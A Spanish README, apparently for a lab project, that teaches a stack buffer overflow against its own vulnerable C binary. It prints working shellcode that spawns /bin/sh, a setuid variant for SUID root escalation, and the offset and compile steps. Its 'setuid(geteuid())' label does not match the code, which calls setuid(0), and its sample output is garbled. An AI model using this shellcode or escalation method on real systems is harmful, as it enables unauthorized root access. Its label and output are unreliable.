# Buffer Overflow Exploitation

Este proyecto muestra cómo explotar una vulnerabilidad de tipo **stack buffer overflow** para ejecutar código arbitrario, obteniendo una shell local y escalando privilegios con el bit **SUID** activado.

---

## Contenido del proyecto

- `vulnerable.c`: binario vulnerable que copia la entrada del usuario a un buffer sin control de límites.
- `exploit.c`: código que construye un payload para ejecutar una shell local (`/bin/sh`).
- `exploit_suid.c`: versión del exploit adaptada para binarios con el bit SUID activado.
- `exploit.asm`: solo el shellcode necesario para lanzar `/bin/sh` sin escalada de privilegios.
- `exploit_suid.asm`: shellcode que primero ejecuta `setuid(geteuid())` y luego lanza la shell.
- `reverse_shell.c`: reverse shell con almacenamiento de IP persistente.

---

## Parte 1: Ejecución de shell local

### Análisis del binario

El binario vulnerable contiene el siguiente código:

```c
void function(char *input) {
    char buffer[64];
    strcpy(buffer, input); // ¡Sin comprobación de límites!
}
```
Este código permite que un atacante sobrescriba la dirección de retorno (RIP) en la pila al introducir más de 64 bytes, redirigiendo el flujo de ejecución a una shellcode personalizada.

### Cálculo del offset

Usando GDB:

```bash
(gdb) run $(python3 -c 'print("A"*80)')
```
El valor de `rip` resulta ser `0x4141414141414141`, lo que confirma que el offset hasta la dirección de retorno es de 72 bytes.

### Shellcode utilizada

La shellcode realiza una llamada directa a `execve("/bin/sh", NULL, NULL)`:

```asm
"\x48\x31\xc0"                              // xor    rax, rax
"\xb0\x3b"                                  // mov    al, 0x3b
"\x48\x31\xff"                              // xor    rdi, rdi
"\x57"                                      // push   rdi
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // mov    rdi, "//bin/sh"
"\x57"                                      // push   rdi
"\x48\x89\xe7"                              // mov    rdi, rsp
"\x48\x31\xf6"                              // xor    rsi, rsi
"\x48\x31\xd2"                              // xor    rdx, rdx
"\x0f\x05"                                  // syscall
```
### Construcción del payload

- NOP sled: relleno con `0x90` (instrucción NOP) hasta alcanzar el offset.
- Shellcode: se coloca al inicio del buffer.
- Dirección de retorno: apunta al NOP sled o directamente al shellcode.

### Compilación

```bash
gcc -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
---

## Parte 2: Explotación de binario con bit SUID

En esta fase se explota un binario con el bit SUID activado (propiedad de root), lo que permite heredar sus privilegios al ejecutar la shellcode.

### Preparación del binario

```bash
sudo chown root:root vulnerable
sudo chmod u+s vulnerable
```
### Shellcode extendido

La shellcode utilizada añade una llamada a `setuid(geteuid())` justo antes de ejecutar `/bin/sh`. Esto garantiza que la shell heredada mantenga los privilegios elevados otorgados por el bit SUID.

```asm
// -- setuid(geteuid()) --
"\x48\x31\xff"                              // xor    rdi, rdi
"\x48\x31\xc0"                              // xor    rax, rax
"\xb0\x69"                                  // mov    al, 0x69 (setuid)
"\x0f\x05"                                  // syscall
// -- execve("/bin/sh", NULL, NULL) --
"\x48\x31\xc0"                              // xor    rax, rax
"\xb0\x3b"                                  // mov    al, 0x3b
"\x48\x31\xff"                              // xor    rdi, rdi
"\x57"                                      // push   rdi
"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  // mov    rdi, "//bin/sh"
"\x57"                                      // push   rdi
"\x48\x89\xe7"                              // mov    rdi, rsp
"\x48\x31\xf6"                              // xor    rsi, rsi
"\x48\x31\xd2"                              // xor    rdx, rdx
"\x0f\x05"                                  // syscall
```
### Validación

Al ejecutar el exploit:

```bash
./exploit_suid
# whoami
root) gid=0(root) groups=0(root)
```
---

## Archivos adicionales

- **`exploit.asm`**: contiene exclusivamente el shellcode de ejecución de `/bin/sh` mediante `execve`, sin escalada de privilegios.
- **`exploit_suid.asm`**: contiene la variante del shellcode que incluye la syscall `setuid(geteuid())` seguida de `execve("/bin/sh", NULL, NULL)` para asegurar la herencia de privilegios cuando el binario explotado tiene el bit SUID activado.
- **`reverse_shell.c`**: reverse shell configurable que permite introducir la IP objetivo por teclado, y guarda la última IP usada en `/tmp/last_ip.txt`.

---

## Autor

**Julen Casajús**  
[GitHub Profile](https://github.com/JulenCasajus)
